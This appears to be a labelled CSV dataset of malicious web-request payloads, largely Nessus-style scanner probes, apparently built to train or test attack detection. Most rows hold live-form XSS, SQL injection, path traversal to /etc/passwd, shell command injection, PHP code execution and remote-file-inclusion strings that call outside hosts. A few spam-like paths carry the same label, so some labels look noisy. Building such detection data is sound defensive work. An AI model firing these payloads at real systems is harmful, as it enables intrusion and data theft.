payload,label
"/moodle/filter/tex/texed.php?formdata=foo&pathname=foo""+||+echo+db+00+00+00+00+00+00+40+30+00+00+34+30+00+00+00+00+00+00+00+00+00+00+00+00+00++>>ctdn",1
"<script>document.cookie=""testquyx=2820;""</script>",1
"/7o5qp766.asp?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/scripts/ion-p.exe?page=c:\winnt\repair\sam,1
/examples/jsp/jsp2/el/calendar.php?serverpath=/etc/passwd\x00,1
/examples/jsp/colors/sql.php?lib_inc=1&btndrop=no&goto=/etc/passwd,1
/path_script/createurl.php?formurl=http://192.168.202.96:8080/no4ghqiguzhst?,1
/scriptedfeed/,1
/modules/jinzora/popup.php?include_path=/etc/passwd\x00,1
/cgi-sys/a1stats/a1disp3.cgi?../../../../../../../etc/passwd,1
"/<meta http-equiv=set-cookie content=""testiklc=904"">",1
/scripts/t769qwej0llr.php3,1
/cgi-bin/articles/default.asp?ichannel=duportal_sql_injections2.nasl'&nchannel=articles,1
"/zabbix/frontends/php/locales.php?download=1&langto=1&extlang["".system('/./tmp/symxvqrirx0+>+/dev/null+&').""]=1",1
"/q703m78q.exe?<meta http-equiv=set-cookie content=""testvowq=604"">",1
"/d765w06j.cfc?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/top.php?stuff=""\x0arm\x09q64118446\x09#",1
/0qhcnefz.mscgi?<script>cross_site_scripting.nasl</script>,1
/awstats/awstats.pl?migrate=|echo;chmod 777 /tmp/qkzpkuflrb.sh;echo|awstats366697.txt,1
"/top.php?stuff=""&rm\x0cq43992942&rem\x0c",1
"/cgi-bin/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331908881','5'--",1
/javascript/bb.exe,1
/javascript/adobe.exe,1
/examples/jsp/jsp2/jspx/top.php?header=../../../../../../../../etc/passwd,1
/0u75ldxq.kspx?<script>cross_site_scripting.nasl</script>,1
/modif_infos.asp?n=/....../boot.ini,1
/main.php?frm_daynight=day&frm_passwd=&frm_referer=q12725766&frm_user=&scr_height=&scr_width=,1
/examples/servlets/servlet/commsrss.php?files[0]=../../../../../../../../../../../../etc/passwd,1
"/fnwhrxyd.aspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/javascript/articles.exe,1
/javascript/webdav.exe,1
/examples/jsp/checkbox/index.php?act=arcade&do=stats&gameid=1',1
"/odzk29aa.exe?<script>document.cookie=""testtfvh=2141;""</script>",1
"/phpmyadmin/index.php?id='union/**/select/**/0,0,999630768,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--",1
/cgi-bin/fileseek2.cgi?head=....//....//....//....//....//....//....//etc/passwd&foot=,1
/javascript/.passwd.vbs,1
/shellscripting/,1
/en-us/account/admin/admin.php?sid=0',1
/awstats/awstats.pl?migrate=|echo;/./tmp/jbqahurnly.sh;echo|awstats560126.txt,1
/scripts/xtextarea.scr.php?globals[pth][spaw]=@rfiurl?globals[pth][spaw]=@rfiurl?,1
/recordings/index.php?id=',1
/cacti/lib/authform.inc.php?path_pre=/etc/passwd\x00,1
/subscriptioncheck/,1
"/0z575z74.kspx?<meta http-equiv=set-cookie content=""testuhsv=9753"">",1
/en-us/account/catalog.php?action=category_show&id=',1
/j4oqyvga.pl?<script>cross_site_scripting.nasl</script>,1
"/help.php?q="";sleep\x0911\x09#",1
/gy23xnjq.php?<script>cross_site_scripting.nasl</script>,1
/scripts/rx9ysf2iwv4j.inc,1
/zuihld5m.idc?<script>cross_site_scripting.nasl</script>,1
/scripts/supporter/tupdate.php?groupid=change&sg=',1
"/gy23xnjq.php?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/ybz5rz7a.exe?<script>document.cookie=""testsbvw=6289;""</script>",1
/cgi-bin/windmail.exe? -n c:\boot.ini,1
/examples/jsp/cal/add_url.htm?node=<script>alert('xss')</script>,1
/print.php?what=article&id=',1
/cgi-bin/admin/components/com_fm/fm.install.php?lm_absolute_path=../../../&install_dir=limbo_com_fm_php_shell.nasl-1332009306,1
/examples/jsp/cal/blog.cgi?submit=viewfile&month=01&year=2004&file=|cat /etc/passwd|,1
/cgi-perl/sensepost.exe?/c+dir,1
"/azcrfs8d.html?<meta http-equiv=set-cookie content=""testjpdr=9205"">",1
/examples/jsp/sessions/index.php?p='nessus,1
/examples/jsp/security/protected/is_cgi_installed3_.j_security_check;jsessionid=5680ad1b9956cf0a8a9f08a20f983ee61893221447.swp,1
/p043snfr.exe?<script>cross_site_scripting.nasl</script>,1
/scripts/base_local_rules.php?dir=<script>alert('base_local_rules_xss.nasl-1331923195')</script>,1
"/phpmyadmin/index.php?op=default&date=200607' union select 1,237660662,1,1,1,1,1,1,1,1--&blogid=1",1
/top.php?stuff=del;q44566983&rem;,1
/cgi-bin/apexec.pl?etype=odp&template=../../../../../../../../../../etc/passwd\x00.html&passurl=/category/,1
"/scripts/review.php?id=1&cat=&subcat=""><script>alert('phpmydirectory_multiple_xss.nasl');</script>",1
"/awstats/awstats.pl?migrate=|echo;/bin/echo -en ""\0174\0044\0000\0377\0347"" >> /tmp/ldlchhikup0;echo|awstats369722.txt",1
/scripts/qcvjnagy16kc.inc,1
/quickstore.cgi?page=../../../../../../../../../../etc/passwd\x00html&cart_id=,1
"/iajtej82.mscgi?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/cgi-home/a1stats/a1disp4.cgi?../../../../../../../etc/passwd,1
"/scripts/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331923203,1242183873 -- ",1
/ywaxntrx.mscgi?<script>cross_site_scripting.nasl</script>,1
/manager/awstatstotals.php?sort={${phpinfo()}}{${exit()}},1
/p043snfr.jsp?<script>cross_site_scripting.nasl</script>,1
/examples/jsp/cal/index.php?gadget=glossary&action=view&term=<script>alert('jaws_xss.nasl');</script>,1
"/index.php?id='union/**/select/**/0,0,559725146,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--",1
/o35zot2r.asp?<script>cross_site_scripting.nasl</script>,1
"/a0imiuf1.x?<meta http-equiv=set-cookie content=""testxqrn=4654"">",1
/scripts/1hactwocbsuo.inc,1
"/examples/servlets/servlet/insertorder.cfm?cfid=1&cftoken=1 union select 1,2,3,4,storename,6,7,8,9,10,11,12,13,14,15 from params""having 1=1",1
/scripts/view-source?view-source,1
/cgibin/ppdscgi.exe,1
/nuh3zirz.html?<script>cross_site_scripting.nasl</script>,1
/m2fpztty.do?<script>cross_site_scripting.nasl</script>,1
/javascript/kernel.exe,1
/top.php?stuff=del;q42465427&rem;,1
/examples/jsp/jsp2/el/direct.php?rf=/etc/passwd\x00,1
/edv3mapy.pl?<script>cross_site_scripting.nasl</script>,1
/catinfo?<u><b>testing,1
/examples/jsp/cal/scp.dll/sendto?template=../../../../../../../../../../../../boot.ini\x00gwextranet_template_dir_traversal.nasl,1
/manager/includes/third_party/adodb/server.php?sql='adodb_sql_sql_injection.nasl,1
/cgi-915/a1stats/a1disp4.cgi?../../../../../../../etc/passwd,1
/e9rx3ya4.fts?<script>cross_site_scripting.nasl</script>,1
/scripts/test-cgi?*,1
"/en-us/9kr0ih0v.jspa?<script>document.cookie=""testzgnm=1183;""</script>",1
/javascript/ezshopper.exe,1
/nmw0do67.nsf?<script>cross_site_scripting.nasl</script>,1
/javascript/statistics.exe,1
/main.php?logout='\x0arm\x09q29624474\x09#,1
"/edv3mapy.cfc?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/examples/jsp/jsp2/el/store.php?crn=42'&action=show&show_products_mode=cat_click,1
/examples/jsp/cal/webdist.cgi?distloc=;id,1
/examples/jsp/jsp2/el/zpanel.php?page=/etc/passwd\x00,1
/e9rx3ya4.aspx?<script>cross_site_scripting.nasl</script>,1
"/faq.php?action=&type=view&s=&id=-1' union select 0,1658544285,0,0,0,0,0--",1
/cgi-home/testcgi.exe,1
/jenna jameson's 1st porn video/,1
"/9kr0ih0v.html?<script>document.cookie=""testzgnm=1183;""</script>",1
"/main.php?stuff=""\x0ddel\x09q53275598\x09#",1
/cfide/scripts/ajax/fckeditor/editor/filemanager/connectors/cfm/upload.cfm?command=fileupload&type=file&currentfolder=/aqongcl.jsp\x00,1
"/main.php?stuff=""ping\x0c-w\x0c11000\x0c-n\x0c1\x0c1.2.3.4&rem\x0c",1
/javascript/vfs.exe,1
/vicodin-prescription/,1
"/ap58k3ci.htm?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/javascript/.passwd.meta,1
"/6qbynt4f.html?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/help.php?q=;del\x09q84834127\x09#,1
/examples/jsp/jsp2/el/am.pl?path=bin/mozilla&action=display_form&file=users/etc/passwd&login=root+login,1
"//a=""%3cscript%20src=%27http://www.example.com/test?rnd=q64992159%27%3e%3c%2fscript%3e"";document.writeln(unescape(a))",1
"/main.php?stuff=""ver\x09>q23164795&rem\x09",1
/examples/jsp/num/store.cgi?startid=../../../../../../../../../etc/passwd\x00.html,1
/nyjgaorz.idc?<script>cross_site_scripting.nasl</script>,1
/cgi-bin/search.pl?realm=all&match=0&terms=test&nocpp=1&maxhits=10&;rank=<script>alert('vulnerable')</script>,1
"/33y9gcqq.dll?<script>document.cookie=""testnvxc=4301;""</script>",1
/scripts/yabb.pl,1
/mpcgi/cgi-test.exe,1
"/zln2hm2z.html?<meta http-equiv=set-cookie content=""testblcp=8120"">",1
"/scripts/index.php?go=detail&id=-99999/**/union/**/select/**/0,1,concat(1332010397,0x3a,1301577513),3,4,5,6,7,8,9,10,11,12,13,14,15,16",1
/pbserver/..\xc0%qf..\xc0%qf..\xc0%qf..\xc0%qf..\xc0%qf../winnt/system32/cmd.exe?/c+dir+c:\+/og,1
/examples/jsp/num/core/api.php?t_path_core=/etc/passwd\x00,1
/subscription-service/,1
/cacti/index.php?search=<script>foo</script>,1
"/dslpwt15.jspa?<meta http-equiv=set-cookie content=""testtkio=5454"">",1
/main.php?logout=ping;-w;7000;-n;1;1.2.3.4|rem;,1
/javascript/tour.exe,1
/e9rx3ya4.jspa?<script>cross_site_scripting.nasl</script>,1
"/bl8sefdm.do?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/ows-bin/a1stats/a1disp4.cgi?../../../../../../../etc/passwd,1
"/u8yiqilu.do?<meta http-equiv=set-cookie content=""testswjp=6010"">",1
/j2kdmfw4.php?<script>cross_site_scripting.nasl</script>,1
/vjbrrppi.cgi?<script>cross_site_scripting.nasl</script>,1
"/yef5f3d5.cfc?<script>document.cookie=""testcrcv=6167;""</script>",1
/scripts/tomcat_proxy_directory_traversal.nasl1332008335,1
"/javascript/.htaccess/''''""""""""",1
/confirmunsubscription.php?output=http://192.168.202.96:8080/swgnhpydbq0t?,1
"/6qbynt4f.nsf?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/scripts/bin/html2text.php,1
/cgis/msmmask.exe?mask=/junk334,1
/psynch/nph-psf.exe?css=http://192.168.202.118:8080/moclyxlwqyfjnp?,1
"/<script>document.cookie=""testyrbs=2855;""</script>",1
"/scripts/index.php?op=default&date=200607' union select 1,1563821747,1,1,1,1,1,1,1,1--&blogid=1",1
"/?<meta http-equiv=set-cookie content=""testexuu=5340"">",1
/main.php?logout=ver\x09>q71472498&rem\x09,1
/apps/web/index.fcgi?servers=&section=<script>alert(document.cookie)</script>,1
"/xsqln7eb.htm?<meta http-equiv=set-cookie content=""testpcbb=9254"">",1
/examples/jsp/jsp2/el/www/delivery/ac.php?bannerid=-1331904368+or+1=1+--+';passthru(base64_decode($_server[http_nessus_2tgmms8c]));die;/*,1
/sgdynamo.exe?htname=<script>alert('vulnerable')</script>,1
/javascript/cv.exe,1
"/main.php?logout=""ping\x0c-w\x0c8000\x0c-n\x0c1\x0c4.3.2.1|rem\x0c",1
/javascript/htpasswd.stackdump,1
/help.php?q='del\x09q19574333\x09#,1
"/j4rdyhw8.pl?<meta http-equiv=set-cookie content=""testrluj=1420"">",1
"/fo564rei.asp?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/index.php?templates_dir=/etc/passwd\x00,1
"/en-us/i686v90l.html?<script>document.cookie=""testfutf=1550;""</script>",1
"/top.php?stuff=""ping,-w,7000,-n,1,1.2.3.4|rem,",1
"/if69ddo1.dll?<meta http-equiv=set-cookie content=""testiabz=5220"">",1
"/bxnyrhmh.pl?<meta http-equiv=set-cookie content=""testmjct=1867"">",1
"/help.php?q="";uname\x09>q77596328\x09#",1
/ht8pn8uq.do?<script>cross_site_scripting.nasl</script>,1
/main.php?stuff='del q29765145 #,1
"/login.php?user=""><script>alert('pubcookie_xss.nasl');</script>",1
"/top.php?stuff=""del\x09q66382972&rem\x09",1
"/o35zot2r.idc?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/manager/include/theme.inc.php?fullpath=/etc/passwd\x00,1
"/main.php?stuff=""del\x0bq36113668&rem\x0b",1
"/l13b77e5.php?<script>document.cookie=""testjvvf=7721;""</script>",1
"/0w155a7c.asp?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"<script>document.cookie=""testvowq=604;""</script>",1
/javascript/out.exe,1
"/en-us/fo564rei.exe?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/scripts/wiki.php/<script>foo</script>,1
/scripts/gdxlwjnlsr6i.php,1
"/t7tm4m0b.htm?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/<script>document.cookie=""testexuu=5340;""</script>",1
/cgi-local/webbbs/webbbs_config.pl?body=aaaaffff&email=test@example.com&followup=10;cat /etc/passwd&name=joe,1
"/""flying imams""/",1
"/main.php?logout=""ping\x0b-w\x0b8000\x0b-n\x0b1\x0b1.2.3.4&rem\x0b",1
"/x7pclv4s.exe?<script>document.cookie=""testiulz=3709;""</script>",1
"/<script>document.cookie=""testdnbh=5237;""</script>",1
/xanax-prescription/,1
"/quagynka.exe?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/scripts/ggvfa_wichxq.php3,1
"/o1zj4u9v.fts?<script>document.cookie=""testabrn=6368;""</script>",1
/<script>alert('vulnerable')</script>,1
/examples/servlets/servlet/index.php?module=<script>foo</script>,1
"/0rufe52p.cfm?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/en-us/fo564rei.kspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/en-us/ddoworrl.idc?<meta http-equiv=set-cookie content=""testvlau=8517"">",1
"/main.php?stuff=""&ver&rem\x09",1
/bzuf9ozq.cfm?<script>cross_site_scripting.nasl</script>,1
/examples/jsp/colors/index.php?id=',1
"/?<script>document.cookie=""testsixi=8451;""</script>",1
/recordings/core/api.php?t_path_core=/etc/passwd\x00,1
"/6dlc2zm9.x?<meta http-equiv=set-cookie content=""testqpux=4016"">",1
/main.php?logout='\x0duname #,1
/phpmyadmin/hsx.cgi?show=../../../../../../../../../../../../../etc/passwd\x00,1
/javascript/3g.exe,1
/javascript/csproj.exe,1
/zmvq66jy.asp?<script>cross_site_scripting.nasl</script>,1
/scripts/rih28haesl0j.html,1
"/help.php?q=""&ver;>q51857139&rem;",1
"/top.php?stuff=""ping -w 9000 -n 1 4.3.2.1&rem ",1
"/ao22ww7y.exe?<script>document.cookie=""testqppc=8767;""</script>",1
/o'bryon/,1
/javascript/certificate.exe,1
/en-us/account/lib/adodb/server.php?sql='adodb_sql_sql_injection.nasl,1
/scripts/t769qwej0llr.cgi,1
/counterpunch_subscriptions/,1
/examples/jsp/sessions/cvslog.cgi?file=<script>window.alert</script>,1
"/ghswfouu.jspa?<script>document.cookie=""testsqmm=5713;""</script>",1
/opensiteadmin/scripts/classes/loginmanager.php?path=http://192.168.202.96:8080/vir0v3xfc?\x00,1
/examples/servlets/servlet/htsearch?exclude=`/etc/passwd`,1
"/help.php?q=""&rm\x0cq57632929&rem\x0c",1
"/fo564rei.idc?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/newsscript.pl?mode=admin,1
"/5qnlm5z2.dll?<script>document.cookie=""testsixi=8451;""</script>",1
/main.php?logout=;uname >q18667266 #,1
/examples/jsp/jsp2/jspx/ttawebtop.cgi/?action=start&pg=../../../../../../../../../../../etc/passwd,1
/e9rx3ya4.pl?<script>cross_site_scripting.nasl</script>,1
/cgibin/.passwd,1
/administrator/components/com_feederator/includes/tmsp/subscription.php?globals[mosconfig_absolute_path]=http://192.168.202.96:8080/vir0v3xfc?,1
/examples/jsp/jsp2/jspx/index.php?site=../../../../../../../../etc/passwd\x00,1
/dda2qr7j.x?<script>cross_site_scripting.nasl</script>,1
"/jdx255ea.dll?<meta http-equiv=set-cookie content=""testziyq=5055"">",1
"/help.php?q=""ver >q26428197&rem ",1
/rbec2ohx.dll?<script>cross_site_scripting.nasl</script>,1
/cgi-bin/forum.php?do=viewtopic&cat=1&topic=1&page=1?<script>foo</script,1
/examples/jsp/cal/top.php?header=../../../../../../../../etc/passwd,1
/scriptpage/source/includes/load_forum.php?mfh_root_path=http://192.168.202.96:8080/vir0v3xfc?,1
"/ywaxntrx.x?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/sys/code/box.inc.php?config[""sipssys""]=http://192.168.202.118:8080/tzhfyzkbomspvm?",1
"//<body><script/src=""http://www.example.com/test?rnd=q96795255""></script>",1
/ows-bin/fileseek.cgi?foot=&head=;cat /etc/passwd|,1
/en-us/jnv890lt.jspa?<script>cross_site_scripting.nasl</script>,1
/examples/jsp/jsp2/jspx/cart32.exe,1
"/cgi-local/htimage.exe/path/filename?2,2",1
/ju0u7kfo.do?<script>cross_site_scripting.nasl</script>,1
/modif_infos.asp?n=../../../../../../../../../etc/passwd\x00,1
/rpc/..\xc0/..\xc0/..\xc0/..\xc0/..\xc0/../winnt/system32/cmd.exe?/c+dir+c:\+/og,1
"/main.php?stuff=""del q63222197&rem ",1
"/main.php?logout=""sleep\x099\x09#",1
/examples/jsp/error/spaw/dialogs/confirm.php?spaw_root=/etc/passwd\x00,1
/vacation_subscription/,1
/cacti/lib/dbman_filter.inc.php?lib_path=/etc/passwd\x00,1
"/scs86g1p.dll?<meta http-equiv=set-cookie content=""testquyx=2820"">",1
/edv3mapy.idc?<script>cross_site_scripting.nasl</script>,1
/product-description/,1
"/8t9v8k7x.php3?<script>document.cookie=""testhvje=9403;""</script>",1
/t7tm4m0b.html?<script>cross_site_scripting.nasl</script>,1
/main.php?logout='&del\x09q65543975\x09#,1
/help.php?q=';rm\x09q61196872\x09#,1
/en-us/account/index.php?action=view&filename=../../../../../../../../../../../../../etc/passwd,1
/help.php?q=&ver\x0c>q32366888&rem\x0c,1
"/g8nu2yy7.jspa?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/examples/jsp/sessions/www/delivery/fc.php?max_type=../../../../../../../../../../etc/passwd\x00,1
/tukodz3j.exe?<script>cross_site_scripting.nasl</script>,1
/console/faces/com_sun_web_ui/help/helpwindow.jsp?windowtitle=</title><script>alert('sun_java_web_console_helpwindow_xss.nasl')</script>,1
/examples/jsp/checkbox/webspirs.cgi?sp.nextform=../../../../../../../../../etc/passwd,1
/examples/servlets/servlet/netauth.cgi?cmd=show&page=../../../../../../../../../etc/passwd,1
"/cacti/nessus""><script>alert('django_admin_xss.nasl')</script>/",1
/examples/jsp/sessions/index.php?selskin=../inc/boxleft.inc\x00&xposbox[l][]=/etc/passwd\x00,1
/main.php?stuff=1417058040' and 1=1 and ''<>'q1w0j8kz,1
/examples/jsp/colors/phf?qalias=x\x0a/bin/cat /etc/passwd,1
/smilscript/,1
"/d7ktpmcq.php3?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"<script>document.cookie=""testwews=8477;""</script>",1
/main.php?stuff=&ping;-w;11000;-n;1;1.2.3.4&rem;,1
/file.cgi?name=/eventcache/../../../../../../../../../../../boot.ini,1
"/main.php?logout=""sleep 10 #",1
"/hipkz026.html?<meta http-equiv=set-cookie content=""testyrbs=2855"">",1
/cgi-bin/sql.php?lib_inc=1&btndrop=no&goto=/etc/passwd,1
/main.php?stuff='\x0drm q67566355 #,1
/scripts/admin/remotecontrol/lsrc.server.php?wsdl,1
/examples/jsp/colors/texis.exe/nessus,1
/adirss.exe/,1
/path_script/createurl.php?formurl=http://192.168.202.118:8080/zz5thkvtmlgl?,1
/xoops232b/htdocs/xoops_lib/modules/protector/onupdate.php?mydirname=a(){}system('/./tmp/caxpcjpwao.sh+>+/dev/null+&'); function v,1
/cgi-bin/demos/demo.browse.php?filename=/etc/passwd,1
/scriptpath/footers.php?tinybb_footers=http://cirt.net/rfiinc.txt?,1
/phpmyadmin/ustorekeeper.pl?command=goto&file=../../../../../../../../../../etc/passwd,1
"/main.php?stuff=""\x0dsleep\x099\x09#",1
/scripts/phprint.php?module=vtiger_lang_crm_lfi.nasl&action=1332009302&lang_crm=../../vtigerservice.php\x00,1
/examples/jsp/jsp2/el/wa.exe?debug-show-version,1
"/ca000007.pl?action=showcart&refpage=\""><script>alert('vulnerable')</script>",1
"/xlj7h65o.html?<script>document.cookie=""testtbbe=856;""</script>",1
/recordings/htmlscript?../../../../../../../../../etc/passwd,1
/javascript/sql.exe,1
/58$$hoteldescription/,1
/javascript/document.jsp,1
/scripts/newsdesk.cgi?t=../../../../../../etc/passwd,1
/sysuser/docmgr/ieedit.stm?url=../,1
"/examples/jsp/sessions/index.php?name=your account&profile=anyone""><script>alert('nessus was here');</script>",1
/examples/jsp/sessions/index.php?search=<script>foo</script>,1
/javascript/been.exe,1
/renewsubscription/,1
"/top.php?stuff="";sleep 9 #",1
/pool_frame.php?poll_id=hyphy;system($_get[com]);&com=dir,1
/en-us/manager/search/data/inputs/script/_new?action=edit,1
/xfkun1ku.cfc?<script>cross_site_scripting.nasl</script>,1
/javascript/clientaccesspolicy.exe,1
/javascript/medium.exe,1
/examples/jsp/num/data/fetch.php?page=',1
"/recordings/admin/index.php?act=login&username=' union select 1,'pafaq_10b4.nasl','5e0bd03bec244039678f2b955a2595aa','',0,'',''--&password=nessus",1
/examples/jsp/colors/includes/third_party/adodb/server.php?sql='adodb_sql_sql_injection.nasl,1
"/zv8tv7h8.php?<script>document.cookie=""testcqwz=9752;""</script>",1
"/moodle/filter/tex/texed.php?formdata=foo&pathname=foo"";ls+-l;chmod+555+/tmp/pcousamoyu;""",1
"<meta http-equiv=set-cookie content=""testbyqe=7474"">",1
/manager/mapserv.exe?map=mapserver_detect.nasl.map,1
/fa8p8lr8.cfc?<script>cross_site_scripting.nasl</script>,1
ftp://192.168.27.203/*<apache_mod_proxy_ftp_glob_xss.nasl>,1
/examples/jsp/colors/pfdispaly?../../../../../../etc/passwd,1
